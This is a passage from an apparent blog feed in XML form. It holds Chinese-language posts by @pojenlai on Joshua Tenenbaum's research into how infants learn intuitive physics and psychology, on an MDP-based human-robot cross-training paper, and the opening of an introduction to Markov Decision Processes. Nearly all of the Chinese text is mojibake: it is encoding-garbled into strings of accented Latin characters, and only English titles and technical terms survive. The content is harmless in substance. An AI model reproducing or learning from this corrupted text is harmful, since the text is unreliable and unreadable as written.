    <content><![CDATA[å‰è¨€Joshua B. Tenenbaum æ•™æˆçš„ç ”ç©¶å¾ˆæœ‰è¶£ï¼Œä»–å¾å°å¬°å…’çš„è¡Œç‚ºå‡ºç™¼ï¼Œç ”ç©¶äººå€‘æ˜¯å¦‚ä½•é€éç„¡æ•¸æ¬¡è·Ÿä¸–ç•Œçš„äº’å‹•ï¼Œå»ºç«‹èµ·ç°¡å–®çš„ç‰©ç†æ¦‚å¿µï¼ˆe.g. ç‰©è³ªä¸æ»…ã€ç‰©è³ªä¸æœƒæµ®åœ¨åŠç©ºä¸­ã€ç‰©é«”æœƒæ’åˆ°å½¼æ­¤ç­‰ç­‰ï¼‰ã€é‚„æœ‰ç°¡å–®çš„å¿ƒç†å­¸ï¼ˆe.g. çœ‹åˆ°åˆ¥äººå»æŠ“é–€æŠŠï¼Œå°±å¯ä»¥çŒœåˆ°é‚£å€‹äººæƒ³è¦é–‹é–€ï¼‰ã€‚
ä»Šå¤©å°±æƒ³è¦ä¾†ä»‹ç´¹ä¸€ä¸‹ä»–çš„ç ”ç©¶å’Œæœªä¾†çš„è—åœ–ï¼Œè®“æœ‰èˆˆè¶£é‘½ç ”äººå·¥æ™ºæ…§çš„è®€è€…ä¸€èµ·çœ‹çœ‹èªçŸ¥ç§‘å­¸è·Ÿäººå·¥æ™ºæ…§çš„æœ€å‰ç«¯ç ”ç©¶ã€‚
æˆ‘å€‘æ˜¯å¾ä»€éº¼åŸºç¤é–‹å§‹å»ºæ§‹èµ·ä¸€åˆ‡çš„èƒ½åŠ›?é€™å€‹å•é¡Œï¼Œå°±æ˜¯ Tenenbaum æ•™æˆç ”ç©¶ä¸­æœ€æ ¸å¿ƒçš„å•é¡Œã€‚
è®“æˆ‘å€‘çœ‹çœ‹ä¸‹é¢é€™éƒ¨å½±ç‰‡ï¼Œåœ¨é€™éƒ¨å½±ç‰‡ä¸­ï¼Œæˆ‘å€‘å¯ä»¥çœ‹åˆ°ä¸€å€‹ 18 å€‹æœˆå¤§çš„å°å¬°å…’ï¼Œå°±å·²ç¶“æœ‰èƒ½åŠ›äº†è§£ â€œæ›¸æœƒè¢«æ«ƒå­å€‘æ“‹ä½ï¼Œå¾—æŠŠæ«ƒå­æ‰“é–‹æ‰èƒ½æŠŠæ›¸æ”¾é€²å»â€ã€â€åˆ¥äººä¸€ç›´æ‹¿æ›¸å»æ’æ«ƒå­ï¼Œæ˜¯å› ç‚ºä»–æƒ³æŠŠæ›¸æ”¾é€²å»ï¼Œè€Œä¸”ä»–æ²’æœ‰æ‰‹é–‹é–€â€ ç­‰ç­‰ç¨å…·è¤‡é›œåº¦çš„ç‰©ç†æ¦‚å¿µå’Œå¿ƒç†å­¸æ¦‚å¿µã€‚

åœ¨æˆ‘å€‘é‚„ç„¡æ³•è‡ªå·±ç”Ÿå­˜ã€é‚„ç„¡æ³•èªªè©±ã€é‚„ç„¡æ³•åšæˆ‘å€‘é•·å¤§å¾Œèƒ½åšçš„å¾ˆå¤šäº‹ä¹‹å‰ï¼Œæˆ‘å€‘å°±å·²ç¶“å­¸æœƒåŸºæœ¬çš„ç‰©ç†å’ŒåŸºæœ¬çš„å¿ƒç†å­¸æ¦‚å¿µã€‚
é€™ä»¶äº‹æƒ…æä¾›çš„æƒ³æ³•æ˜¯ï¼Œæˆ‘å€‘å¦‚æœå¯ä»¥æ‰“é€ å‡ºæœ‰èƒ½åŠ›è‡ªå·±å­¸æ‡‚é€™äº›åŸºç¤ç‰©ç†çŸ¥è­˜å’Œå¿ƒç†å­¸çŸ¥è­˜çš„æ©Ÿå™¨ï¼Œé‚£é€™éƒ¨æ©Ÿå™¨æ˜¯å¦å°±èƒ½å¤ å†å­¸æœƒå„å¼å„æ¨£çš„æŠ€èƒ½ï¼Ÿå°±å¦‚åŒæœ‰èƒ½åŠ›å­¸æœƒåŸºç¤ç‰©ç†å’Œå¿ƒç†å­¸çŸ¥è­˜çš„å°å¬°å…’ï¼Œå°±æœ‰èƒ½åŠ›å­¸æœƒé•·å¤§å¾Œéœ€è¦å­¸çš„å„ç¨®æŠ€èƒ½ã€‚
è…¦æµ·ä¸­çš„éŠæˆ²å¼•æ“é›–ç„¶å¬°å…’çš„å­¸ç¿’éç¨‹æä¾›äº†æˆ‘å€‘ä¸€äº› insightï¼Œè®“ç ”ç©¶æœ‰äº†åˆ‡å…¥æ–¹å‘ï¼Œä½†æœ‰èƒ½åŠ›å­¸ç¿’çš„åŸºç¤åˆ°åº•æ˜¯ä»€éº¼ï¼Ÿ
ä»¥ Tenenbaum æ•™æˆçš„æƒ³æ³•ä¾†èªªï¼Œå¤§æ¦‚å°±æ˜¯ä¸€å€‹ èƒ½å¤ è‡ªæˆ‘ä¿®æ­£çš„ã€programmable çš„éŠæˆ²å¼•æ“ã€‚
ä¸Šé¢é€™å¥è©±åˆ°åº•åœ¨è¬›ä»€éº¼æ±è¥¿ï¼Ÿè®“æˆ‘å€‘ç¹¼çºŒå¾€ä¸‹çœ‹ã€‚
å¤§å®¶å¯èƒ½éƒ½æœ‰ç¶“é©—ï¼Œç•¶ä½ è¦æ‰¾ä¸€ä»¶æ±è¥¿ï¼Œä½ æœƒé–‹å§‹å›æƒ³èµ·ä½ ä¸Šæ¬¡é‚„çœ‹è¦‹é‚£å€‹æ±è¥¿çš„å ´æ™¯ï¼Œå›æ†¶ä½ èµ°éçš„æ¯å€‹åœ°æ–¹ï¼Œç›´åˆ°ä½ ä¸åœ¨è¨˜å¾—é‚£ä»¶æ±è¥¿é‚„åœ¨ï¼Œä½ å°±å¯ä»¥å›åˆ°é‚£å€‹åœ°æ–¹å°‹æ‰¾ã€‚
å°å°çš„ä¸€ä»¶äº‹æƒ…ï¼ŒåŒ…å«äº†ä½ çš„è¨˜æ†¶èƒ½åŠ›ã€å ´æ™¯æƒ³åƒèƒ½åŠ›ï¼Œå°±å¥½åƒä½ çš„è…¦æµ·ä¸­æœ‰ä¸€å€‹å¯è®€å‡ºæª”æ¡ˆçš„éŠæˆ²ã€‚
å†èˆ‰ä¸€å€‹ä¾‹å­ï¼Œç•¶ä½ è¦æ‹¿ä¸€å€‹å¾ˆçè²´çš„èŠ±ç“¶ï¼Œä½ æ˜¯ä¸æ˜¯æœƒå¾ˆå°å¿ƒç¿¼ç¿¼åœ°æ‹¿ï¼Ÿå› ç‚ºä½ ç”šè‡³å¯ä»¥åœ¨è…¦æµ·ä¸­æƒ³åƒå¦‚æœæ²’æ‹¿å¥½èŠ±ç“¶ï¼Œå¯èƒ½æœƒæ‘”åˆ°åœ°ä¸Šç ´æ‰ï¼Ÿ
é€™è·Ÿæˆ‘å€‘åœ¨é›»è…¦æ¨¡æ“¬ä¸­çœ‹åˆ°çš„ç¾è±¡ç°¡ç›´ä¸€æ¨¡ä¸€æ¨£ï¼Œä½ å¯ä»¥æ¨¡æ“¬ä¸Šåƒæ¬¡ï¼Œä½†ä¸æœƒç›´æ¥æ”¹è®Šç¾å¯¦ä¸–ç•Œï¼›å°±åƒä½ å¯ä»¥åœ¨è…¦æµ·ä¸­æ¨¡æ“¬ç„¡æ•¸æ¬¡ä¸Šå°æ¼”è¬›çš„ç•«é¢ã€‚
é€™å€‹æ¦‚å¿µå¾ˆé‡è¦ï¼Œå› ç‚ºåœ¨è™•ç†è¨Šæ¯è·Ÿæ€è€ƒçš„æ™‚å€™ï¼Œæˆ‘å€‘å¹¾ä¹æ˜¯æ™‚æ™‚ä¾è³´é€™å€‹è…¦æµ·ä¸­éŠæˆ²å¼•æ“ã€‚é›–ç„¶æœ‰å¾ˆå¤šç¿’æ…£å› ç‚ºå·²ç¶“è¢«é‡è¤‡å¤ªå¤šæ¬¡ï¼Œåœ¨ä½¿ç”¨æ™‚å¹¾ä¹ä¸éœ€è¦èª¿ç”¨éŠæˆ²å¼•æ“ä¾†æ¨¡æ“¬ï¼Œä½†æ˜¯é€™äº›ç¿’æ…£å¿…ç„¶æ˜¯ç¬¦åˆæˆ‘å€‘è…¦å…§éŠæˆ²å¼•æ“çš„è¦å‰‡ã€‚
ä»€éº¼æ„æ€å‘¢ï¼Ÿ
å°±åƒæˆ‘å€‘æ¯å€‹äººéƒ½æ‹¿éå¾ˆå¤šæ¬¡æ¯å­ï¼Œæ‰€ä»¥å¹¾ä¹æ˜¯æƒ³éƒ½ä¸ç”¨æƒ³å°±å¯ä»¥æ‹¿èµ·ä¾†ã€‚ä½†å¦‚æœæœ‰ä¸€å¤©ï¼Œæœ‰å€‹æ„›æ•´äººçš„æœ‹å‹æŠŠä½ çš„æ¯å­ç”¨å¼·åŠ›è† é»åœ¨æ¡Œä¸Šï¼Œæ–¼æ˜¯ä½ è¦æ‹¿æ¯å­ç™¼ç¾å®ƒç©©å¦‚æ³°å±±å®Œå…¨ä¸å‹•ï¼Œä½ å°±æœƒæ„Ÿåˆ°é©šè¨ã€‚å› ç‚ºåœ¨ä½ çš„è…¦æµ·ä¸­ï¼Œæ¯å­çš„é‡é‡æ˜¯æœ‰ä¸€å®šç¨‹åº¦çš„ï¼Œè€Œä¸€èˆ¬æƒ…æ³ä¸‹ï¼Œä¸å¯èƒ½é‡åˆ°ä½ æ‹¿ä¸èµ·ä¾†ã€‚
æ‰€ä»¥é€™æ™‚å€™ä½ å°±æœƒé–‹å§‹ç ”ç©¶ï¼Œç‚ºä»€éº¼ä½ çœ‹åˆ°çš„ç¾è±¡è·Ÿä½  è…¦æµ·ä¸­çš„éŠæˆ²å¼•æ“ é æ¸¬å¾—ä¸ä¸€æ¨£ï¼Ÿç›´åˆ°ä½ ç™¼ç¾åŸä¾†æ˜¯è¢«é»åœ¨æ¡Œä¸Šï¼Œä½ è…¦æµ·ä¸­çš„éŠæˆ²å¼•æ“å°±æœƒç™¼ç”Ÿè®ŠåŒ–ï¼Œè®“å®ƒæœªä¾†æ›´æœ‰å¯èƒ½é æ¸¬åˆ°æ¯å­æœƒè¢«é»åœ¨æ¡Œä¸Šï¼ˆä¼¼ä¹ä¹Ÿæœ‰é»å¼·åŒ–å­¸ç¿’çš„å‘³é“ï¼Œå°å§ï¼Ÿï¼‰ã€‚
é€™ä¹Ÿæ˜¯ç‚ºä»€éº¼é­”è¡“å¾ˆæœ‰è¶£ï¼Œå› ç‚ºé­”è¡“å¸¸å¸¸æ¨ç¿»æˆ‘å€‘éŠæˆ²å¼•æ“å…·å‚™çš„è¦å‰‡ï¼›

æ€éº¼æ‰“é€ åƒäººä¸€æ¨£å­¸ç¿’çš„æ©Ÿå™¨ ?Tenenbaum æ•™æˆçš„çŸ­æœŸç ”ç©¶è—åœ–å¦‚ä¸‹åœ–ï¼Œä»–çš„æƒ³æ³•ï¼Œæ˜¯å¾è¦–è¦ºè‘—æ‰‹ï¼š

ç‚ºä»€éº¼æ˜¯å¾è¦–è¦ºï¼Œæˆ‘æƒ³é€™ä¹Ÿå¾ˆåˆç†ï¼Œç•¢ç«Ÿåœ¨æˆ‘å€‘é‚„ä¸å¤ªæœƒèµ°è·¯ã€ä¸å¤ªæœƒæŠ“æ±è¥¿çš„æ™‚å€™ï¼Œæˆ‘å€‘å°±å·²ç¶“ä¸æ–·åœ°åœ¨çœ‹é€™ä¸–ç•Œä¸­çš„å„é …äº‹ç‰©ï¼Œé–‹å§‹å­¸ç¿’ä¸–ç•Œè£¡çš„ä¸€åˆ‡è¦å‰‡ï¼Œè€Œé€™äº›è¦å‰‡éƒ½æ˜¯æˆ‘å€‘å¯ä»¥æ­£å¸¸èµ°è·¯ã€æŠ“å¥½æ±è¥¿çš„é‡è¦åŸºç¤ã€‚
æœ‰äº†è—åœ–ä¹‹å¾Œï¼Œæ¥ä¸‹ä¾†å°±æ˜¯æ–¹æ³•ï¼Œæ–¼æ˜¯ä»–å€‘ä¹Ÿæå‡ºäº†ä¸€å€‹å¤§çš„æ¶æ§‹ï¼š

è€Œæ’èµ·é€™å€‹å¤§æ¶æ§‹çš„æŠ€è¡“ç´°ç¯€ï¼Œå°±æ˜¯æˆ‘å€‘è€³ç†Ÿèƒ½è©³çš„å„ç¨®æŠ€è¡“ï¼š

ä½†é€™äº›æŠ€è¡“å¦‚ä½•äº¤äº’ä½¿ç”¨ï¼Ÿå¦‚ä½•æ§‹å»ºæˆå…·å‚™äººé¡èªçŸ¥èƒ½åŠ›çš„åŸºç¤ï¼Ÿéƒ½é‚„æ˜¯å‰›èµ·æ­¥çš„ç ”ç©¶é¡Œç›®ï¼Œæ‰€ä»¥å°±ç•™å¾…å¤§å®¶å»ç™¼æ˜ã€‚
ç¸½çµä»Šå¤©è·Ÿå¤§å®¶ç°¡å–®ä»‹ç´¹äº† Tenenbaum æ•™æˆçš„ç ”ç©¶ï¼Œå€‹äººè¦ºå¾—ä»–çš„ç ”ç©¶å‡ºç™¼é»éå¸¸æœ‰è¶£ï¼Œä¹Ÿå®Œå…¨å¯ä»¥è·Ÿæˆ‘å€‘çš„æˆé•·ç¶“é©—ä¸²é€£ï¼Œå¸Œæœ›æœªä¾†å¯ä»¥çœ‹åˆ°æ›´å¤šæœ‰è¶£çš„ç ”ç©¶æˆæœã€‚
å»¶ä¼¸é–±è®€
MIT AGI: Building machines that see, learn, and think like people (Josh Tenenbaum)
Building Machines that Learn &amp; Think Like People - Prof. Josh Tenenbaum ICML2018

é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººã€é›»è…¦è¦–è¦ºå’Œäººå·¥æ™ºæ…§æœ‰å°‘è¨±ç ”ç©¶ï¼Œæ­£åœ¨å­¸ç¿’ç”¨å¿ƒé«”æœƒäº‹ç‰©çš„æœ¬è³ªè·Ÿä¸æ–·é€²å…¥å­¸ç”Ÿå¿ƒæ…‹æ”¹é€²ã€‚
]]></content>
      <tags>
        <tag>artificial intelligence</tag>
        <tag>cognitive science</tag>
      </tags>
  </entry>
  <entry>
    <title>å¦‚ä½•ç”¨ Markov Decision Process æè¿° Human-Robot Interaction å•é¡Œ</title>
    <url>/2018/11/24/intro-to-mdp-on-hri/</url>
    <content><![CDATA[å‰è¨€ä¸Šæ¬¡æˆ‘å€‘ä»‹ç´¹äº† Markov Decision Process çš„åŸºæœ¬æ¦‚å¿µï¼Œé›–ç„¶ä¸Šæ¬¡æœ‰ç°¡å–®æåˆ° MDP çš„æ‡‰ç”¨ï¼Œä½†ä¸¦ä¸æ˜¯å¾ˆè©³ç´°ï¼Œæ‰€ä»¥ä»Šå¤©æˆ‘å€‘æƒ³å˜—è©¦æŠŠ MDP è·Ÿ Human-Robot Interaction å•é¡Œé€£çµèµ·ä¾†ï¼Œä¸€èµ·ä¾†çœ‹æ€éº¼å¾ä¸€å€‹ç°¡å–®çš„ insight å‡ºç™¼ï¼ŒåŠ ä¸Š MDP çš„æ•¸å­¸åŸºç¤ï¼Œæœ€å¾Œå½¢æˆä¸€ç¯‡åš´è¬¹çš„è«–æ–‡ ( Human-Robot Interactive Planning using Cross-Training: A Human Team Training Approach ) å§ï¼
é€™ç¯‡è«–æ–‡è¦è¬›ä»€éº¼Human-Robot Interaction æ˜¯ä¸€å€‹æ¢è¨æ©Ÿå™¨äººè·Ÿäººå¦‚ä½•äº’å‹•çš„å­¸ç§‘ï¼Œè€Œç›®å‰æœ€å¸¸è¨è«–çš„è­°é¡Œä¹‹ä¸€å°±æ˜¯ï¼Œå¦‚ä½•è®“æ©Ÿå™¨äººå’Œäººå¯ä»¥æ›´æœ‰æ•ˆç‡åœ°ä¸€èµ·å®Œæˆå·¥ä½œã€‚é€™ç¯‡è«–æ–‡å˜—è©¦è®“æ©Ÿå™¨äººè·Ÿäººé€²è¡Œ job rotationï¼Œè®“å½¼æ­¤éƒ½è™•åœ¨å°æ–¹çš„è™•å¢ƒä¸­ï¼Œé€²è€Œè®“åˆä½œçš„æ•ˆç‡æå‡ã€‚
é€™ç¯‡ paper æ˜¯æºè‡ªæ–¼ä»€éº¼ insightï¼ŸInsight 1ï¼šåŒä¸€å€‹ team è£¡é¢çš„æˆå“¡ï¼Œè™•ç†äº‹æƒ…çš„æ–¹æ³•ï¼ˆmental modelï¼‰è¶Šæ¥è¿‘ï¼Œä»–å€‘è¶Šå®¹æ˜“ç†è§£å½¼æ­¤çš„éœ€è¦ï¼Œé€²è€Œæå‡åœ˜éšŠçš„æ•ˆç‡ã€‚

Insight 2: é€²è¡Œ Cross-Trainingï¼Œä¹Ÿå°±æ˜¯è®“æ©Ÿå™¨äººå’Œäººè¼ªæµäº¤æ›å·¥ä½œï¼Œè®“ä»–å€‘éƒ½å»åšå°æ–¹æœƒåšçš„äº‹ï¼Œå¯ä»¥è®“ä»–å€‘çš„ mental model æ›´æ¥è¿‘ã€‚

é€™å€‹ insight æ€éº¼ç”¨æ•¸å­¸æè¿°ï¼Ÿçœ‹äº†ä¸Šé¢çš„ insightï¼Œæ„Ÿè¦ºé —ç¬¦åˆç›´è¦ºçš„ï¼Œå› ç‚ºæˆ‘å€‘å¯ä»¥æƒ³åƒè‡ªå·±è·Ÿå…¶ä»–äººåˆä½œï¼Œå¦‚æœå¯ä»¥åšåšçœ‹å°æ–¹çš„å·¥ä½œï¼Œå°±æ›´å®¹æ˜“é«”æœƒå°æ–¹åšäº‹æƒ…æ‰€æ„Ÿå—åˆ°çš„éœ€æ±‚ï¼Œåœ¨åˆä½œæ™‚ä¹Ÿæ›´å®¹æ˜“æ»¿è¶³å°æ–¹çš„éœ€æ±‚ã€‚
ä½†å•é¡Œæ˜¯ï¼Œé€™æ¨£çš„ç›´è¦ºæ€éº¼è·Ÿæ•¸å­¸æ¥èµ·ä¾†ï¼Ÿ
é€™æ™‚å€™ï¼Œå°±è¦ç”¨åˆ°æˆ‘å€‘ä¸Šé€±å­¸ç¿’çš„ MDP äº†ï¼Œé¦–å…ˆï¼Œé€™ç¯‡è«–æ–‡å‡è¨­ï¼Œäººé¡çš„ mental modelï¼ˆæˆ–èªªç™½è©±ä¸€é»ï¼Œè¡Œç‚ºçš„åå¥½ï¼‰å¯ä»¥ç”¨ MDP ä¾†æè¿°ã€‚

MDP è·Ÿæ¬²æè¿°å•é¡Œçš„åˆæ­¥é—œä¿‚

è‹¥æˆ‘å€‘ä»”ç´°çœ‹ MDP è£¡é¢çš„æ‰€æœ‰è®Šæ•¸ï¼ŒçœŸæ­£éœ€è¦æˆ‘å€‘ç…©æƒ±çš„æœ‰å…©ä»¶äº‹ - reward è¦æ€éº¼å®šç¾©ï¼ŸTransition probabilities è¦æ€éº¼å®šç¾©ï¼Ÿ
é€™å…©å€‹åœ°æ–¹å°±æ˜¯é€™ç¯‡è«–æ–‡è¦å‹•æ‰‹è…³çš„åœ°æ–¹äº†ã€‚é¦–å…ˆï¼Œä½œè€…å‡è¨­æ©Ÿå™¨äººå·²ç¶“æœ‰ä¸€é» prior knowledgeï¼Œä¹Ÿå°±æ˜¯æœ‰ç¬¬ä¸€ç‰ˆçš„ reward è·Ÿ transition probabilitiesï¼Œæ–¼æ˜¯å°±å¯ä»¥ç”¨ value iteration çš„æ¼”ç®—æ³•ç®—å‡ºç¬¬ä¸€ç‰ˆæ©Ÿå™¨äººçš„ policyã€‚
é€™ä¸€ç‰ˆ policy å¯ä»¥æƒ³æˆæ˜¯æ©Ÿå™¨äººåŸæœ¬èªç‚ºè©²æ€éº¼å®Œæˆä»»å‹™çš„æ–¹æ³•ã€‚ä½†å¯èƒ½è·Ÿäººé¡å¤¥ä¼´çš„å·¥ä½œæ–¹æ³•ä¸ä¸€æ¨£ï¼Œæ‰€ä»¥å°±éœ€è¦ä¾†åš cross trainingã€‚

æ€éº¼æŠŠ cross training è·Ÿ MDP æ¥èµ·ä¾†

æ¥ä¸‹ä¾†å°±æ˜¯é‡é»ï¼Œæˆ‘å€‘å…ˆå‡è¨­ï¼Œæ©Ÿå™¨äººè·Ÿäººæ˜¯ä¸€èµ·è¦é–èºçµ²ï¼šäººè² è²¬æ”¾èºçµ²åˆ°ä¸‰å€‹è¦é–çš„ä½ç½®ï¼Œæ©Ÿå™¨äººè² è²¬æŠŠèºçµ²é–ç·Šã€‚é‚£ Cross training æœ‰å…©å€‹éšæ®µï¼Œé¦–å…ˆæ˜¯ forward phaseï¼Œä¹Ÿå°±æ˜¯æ©Ÿå™¨äººè·Ÿäººéƒ½è² è²¬è‡ªå·±è©²åšçš„åœ°æ–¹ï¼›æ¥è‘—æ˜¯ rotation phaseï¼Œä¹Ÿå°±æ˜¯æ©Ÿå™¨äººè·Ÿäººäº’æ›ï¼Œé€™æ™‚äººè¦è² è²¬é–èºçµ²ï¼Œæ©Ÿå™¨äººè² è²¬æ”¾èºçµ²ã€‚
æ–¼æ˜¯ï¼Œé›–ç„¶ä¸€é–‹å§‹æ©Ÿå™¨äººæœ‰ç¬¬ä¸€ç‰ˆ policyï¼Œä½†æ©Ÿå™¨äººåœ¨ forward phase å¯ä»¥è§€å¯Ÿï¼Œå¾æŸå€‹ state sï¼Œè‡ªå·±åšå®ŒæŸå€‹ action å¾Œï¼Œäººæœƒè®“ state è®Šæˆæ€éº¼æ¨£çš„ sâ€™ï¼ˆé€™é‚Šç”¨ sâ€™ è¡¨ç¤ºç¶“éæ©Ÿå™¨äººå’Œäººçš„ action å¾Œï¼Œstate s çš„ä¸‹ä¸€å€‹ stateï¼‰ã€‚ç„¶å¾Œå°±ç”¨é€™æ¨£çš„ç‹€æ…‹è®ŠåŒ–ä¾†æ›´æ–° MDP çš„ transition functionã€‚æ¥è‘—ï¼Œåœ¨ rotation phaseï¼Œé€™æ™‚æ©Ÿå™¨äººæ˜¯è¦æ“ºæ”¾èºçµ²ï¼Œæ‰€ä»¥å°±å¯ä»¥ç”±äººä¾†çµ¦äºˆæ©Ÿå™¨äºº reward çš„ feedbackï¼Œè®“æ©Ÿå™¨äººå¯ä»¥æ›´æ–°è‡ªå·±å°å„ state çš„ reward èªçŸ¥ï¼Œæ‰€ä»¥å°±å¯ä»¥ç®—å‡ºæ–°çš„ã€è¼ƒæ¥è¿‘äººé¡å¤¥ä¼´çš„ policyã€‚ï¼ˆå¤§å®¶æ‡‰è©²å¯ä»¥çœ‹å‡ºï¼Œå³ä½¿ä¸åŒäººçš„ policy åå¥½ä¸åŒï¼Œæ©Ÿå™¨äººéƒ½å¯ä»¥é€éé€™å¥—æ¼”ç®—æ³•ï¼Œå»é©æ‡‰è‡ªå·±å¤¥ä¼´çš„åå¥½ï¼‰
é€™ç¯‡è«–æ–‡çš„é™åˆ¶
é¦–å…ˆï¼Œäººé¡çš„ mental model ç›¸ç•¶è¤‡é›œï¼Œç”¨ MDP ä¾† model æœ‰é»åƒæ˜¯æŠŠäººé¡çš„åå¥½ç”¨ transition probabilities è·Ÿ reward è¡¨ç¤ºï¼Œä½†é€™æ¨£æ¯”è¼ƒåƒæ˜¯çŸ¥å…¶ç„¶ä¸çŸ¥å…¶æ‰€ä»¥ç„¶ã€‚å°±åƒæˆ‘å€‘å¦‚æœè·Ÿå…¶ä»–äººåˆä½œï¼Œæˆ‘å€‘å¯ä»¥å»çŒœæƒ³ã€ç”šè‡³ç†è§£ç‚ºä»€éº¼å¤¥ä¼´æœƒæœ‰ä»–çš„åå¥½ã€‚ä½†ç”¨ MDP é¡¯ç„¶æ²’æœ‰é€™æ¨£çš„æè¿°èƒ½åŠ›ã€‚

å¦‚æœä»Šå¤©è¦è®“æ©Ÿå™¨äººèå…¥äººé¡ç¤¾æœƒï¼Œè¦åšæ›´å¤šçš„äº‹ï¼Œé€™æ¨£çš„ model èƒ½å¤ æ›´ general å—ï¼Ÿç›®å‰çš„åšæ³•çœ‹èµ·ä¾†æ˜¯ï¼Œä¸€æ—¦è¦åšçš„äº‹æƒ…è®Šå¾—å¾ˆå¤šï¼Œå°±å¾—è¨“ç·´å¾ˆå¤šå¥— MDPã€‚


é€™ç¯‡è«–æ–‡çš„è²¢ç»é›–ç„¶ä¸Šé¢è¬›äº†ä¸€äº›é™åˆ¶ï¼Œä½†é€™ç¯‡è«–æ–‡å…¶å¯¦æ˜¯å¾ˆè®šï¼Œ110 æ¬¡çš„å¼•ç”¨æ•¸ä¸æ˜¯æ›è‘—å¥½çœ‹çš„ã€‚

è·³è„«ç”¨å–®ç´” Reinforcement Learning çš„æ–¹å¼ä¾†å­¸ç¿’è·Ÿäººåˆä½œï¼Œè€Œæ˜¯å°‡åˆä½œå•é¡Œå·§å¦™åœ°ç”¨ MDP ä¾†è¡¨ç¤ºäººé¡ mental modelï¼Œç„¶å¾Œç”¨ cross training ä¾†æ”¹é€²åˆä½œçš„æ•ˆç‡ã€‚

ç”¨åš´è¬¹çš„æ•¸å­¸æ–¹æ³•ç²¾æº–åœ°æè¿°é€™éç¨‹ï¼Œé›–ç„¶è‹¥ä»”ç´°çœ‹ paperï¼Œæˆ‘å€‘é‚„æ˜¯æœƒçœ‹åˆ°ä¸å°‘å‡è¨­ï¼Œè®“æ¨å°å¯ä»¥é€²è¡Œä¸‹å»ï¼Œä½†å·²ç¶“ç®—æ˜¯ç›¸å°é —åš´è¬¹çš„ paper äº†ã€‚


æˆ‘é€™ç¯‡ä»‹ç´¹æ²’ cover åˆ°çš„å•é¡Œ
Transition probabilities åœ¨ä¸Šå‘¨ä»‹ç´¹çš„ MDP å®šç¾©ä¸­ï¼Œæåˆ° MDPæ˜¯ç”¨ä¾†è™•ç†ç•¶æ¡å–ä¸€å€‹ actionï¼Œå› ç‚ºç’°å¢ƒä¸­æœ‰ä¸€äº›ä¸ç¢ºå®šçš„å› ç´ ï¼Œè®“æˆ‘å€‘æ¡å–å®Œ action æœƒåˆ°é”çš„ state sâ€™ æœ‰å¤šç¨®å¯èƒ½çš„å•é¡Œã€‚é‚£é€™ç¯‡è«–æ–‡çš„æ„æ€æ˜¯è¦æ©Ÿå™¨äººæŠŠäººé¡ action ç•¶åšä¸€å€‹ç’°å¢ƒä¸­çš„è®Šå› ï¼Œç„¶å¾Œæ©Ÿå™¨äººèªçŸ¥çš„ transition probabilities ç›¡é‡å¾€äººé¡çš„åå¥½é è¿‘ï¼Ÿï¼ˆå› ç‚ºå¾ current state s é–‹å§‹ï¼Œæ©Ÿå™¨äººæ¡å–æŸå€‹ actionï¼Œäººé¡ä¹Ÿæ¡å–æŸå€‹ actionï¼Œè®“ state è®Šæˆ sâ€™ï¼‰

å¯¦ä½œä¸Šè¦æ€éº¼å®šç¾© state æœ‰å¤šå°‘ï¼Ÿaction åˆæœ‰å¤šå°‘ï¼Ÿ


ç¸½çµä»Šå¤©è·Ÿå¤§å®¶ä»‹ç´¹äº†ä¸€ç¯‡è«–æ–‡ï¼Œä¾†è¬›æ€éº¼ä½¿ç”¨ MDP åˆ° HRI çš„å•é¡Œä¸Šé¢ï¼Œæˆ‘è¦ºå¾—é€™å€‹é ˜åŸŸå¾ˆæœ‰è¶£ï¼Œä¹Ÿå¾ˆå€¼å¾—æŠ•å…¥ï¼Œå¸Œæœ›å°æƒ³è¦å…¥é–€çš„æœ‹å‹æœ‰å¹«åŠ©ã€‚
å»¶ä¼¸é–±è®€
Mathematical Models of Adaptation In Human-Robot Collaboration
Github repository: awesome-human-robot-interaction

é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººã€é›»è…¦è¦–è¦ºå’Œäººå·¥æ™ºæ…§æœ‰å°‘è¨±ç ”ç©¶ï¼Œæ­£åœ¨å­¸ç¿’ç”¨å¿ƒé«”æœƒäº‹ç‰©çš„æœ¬è³ªè·Ÿä¸æ–·é€²å…¥å­¸ç”Ÿå¿ƒæ…‹æ”¹é€²ã€‚
]]></content>
      <tags>
        <tag>Human-Robot Interaction</tag>
        <tag>Markov Decision Process</tag>
      </tags>
  </entry>
  <entry>
    <title>ç°¡ä»‹ Markov Decision Process èˆ‡å…¶æ‡‰ç”¨</title>
    <url>/2018/10/27/intro-to-mdp-and-app/</url>
    <content><![CDATA[å‰è¨€ä»Šå¤©æƒ³è·Ÿå¤§å®¶ä»‹ç´¹ä¸€å€‹åœ¨ Reinforcement Learning ä¸­ç›¸ç•¶é‡è¦çš„åŸºç¤ - Markov Decision Processï¼ˆMDPï¼‰ã€‚æ¯”èµ·ä¸€èˆ¬çš„ searchï¼ŒMDP èƒ½å¤  model æ›´è¤‡é›œçš„å•é¡Œï¼Œä»Šå¤©å°±è®“æˆ‘å€‘ä¾†ä»‹ç´¹ MDP çš„åŸºç¤è§€å¿µï¼Œé‚„æœ‰ä»–çš„æ‡‰ç”¨è·Ÿé™åˆ¶ã€‚
MDP æƒ³è¦ model ä»€éº¼å•é¡Œï¼ŸMDP æƒ³è¦è™•ç†çš„å•é¡Œæ˜¯ï¼šç•¶ä½ æ¡å–çš„ action ä¸æœƒå®Œå…¨å¦‚ä½ æ‰€æƒ³çš„é”åˆ°ä½ æƒ³è¦çš„ stateï¼Œä½ è©²å¦‚ä½•æ¡å– actionï¼Ÿ
èˆ‰ä¾‹ä¾†èªªï¼ˆé€™ä¾‹å­å‡ºè‡ªå»¶ä¼¸é–±è®€ 1 è£¡é¢çš„ MDPï¼‰ï¼Œå‡è¨­æœ‰ä¸€éš»æ©Ÿå™¨äººï¼Œåœ¨ä¸€å€‹è¿·å®®è£¡é¢ï¼Œä»–å¾æœ€å·¦ä¸‹è§’å‡ºç™¼ï¼Œè¦èµ°åˆ°çµ‚é»ï¼ˆ+1 or -1 éƒ½æ˜¯çµ‚é»ï¼‰ï¼Œè€Œä¸”è¦ç›¡é‡è®“ reward æœ€å¤§ï¼š
(This image comes from UC Berkeley CS188 Lecture 8)
